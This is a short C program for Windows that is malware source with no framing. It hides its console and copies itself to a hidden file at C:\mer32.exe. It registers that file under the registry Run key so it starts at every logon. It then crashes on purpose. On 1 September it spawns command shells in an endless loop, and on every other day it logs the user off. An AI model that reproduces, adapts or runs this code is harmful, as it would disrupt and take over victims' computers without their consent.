#include <stdio.h>
#include <time.h>
#include <windows.h>

int main() {
	FreeConsole();

	struct tm* tinfo;
	int val;
	char executable[MAX_PATH];
	char* outfile = R"(C:\mer32.exe)";
	char month[3];
	char day[3];
	FILE *file;
	HKEY hkey;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD taskmgr = 1;
	time_t timer;

	if (!(file = fopen(outfile, "r"))) {
		GetModuleFileNameA(NULL, executable, MAX_PATH);
		CopyFile(executable, outfile, FALSE);

		DWORD attr = GetFileAttributes(outfile);
		SetFileAttributes(outfile, attr + FILE_ATTRIBUTE_HIDDEN);

		RegCreateKey(HKEY_CURRENT_USER,
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			&hkey);

		RegSetValueEx(hkey,
			"maria",
			0,
			REG_SZ,
			(unsigned char*)outfile,
			strlen(outfile));

		RegCloseKey(hkey);

		int* p = 0x00000000;   
		*p = 13;;
	}

	time(&timer);
	tinfo = localtime(&timer);

	strftime(day, 3, "%d", tinfo);
	strftime(month, 3, "%m", tinfo);

	if (strcmp(month, "09") == 0 && strcmp(day, "01") == 0) {
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		for (;;) {
			CreateProcess(NULL,
					"cmd",
					NULL,
					NULL,
					FALSE,
					0,
					NULL,
					NULL,
					&si,
					&pi);
		}
	} else {
		ExitWindows(0, 0);	
	}

	return 0;
}
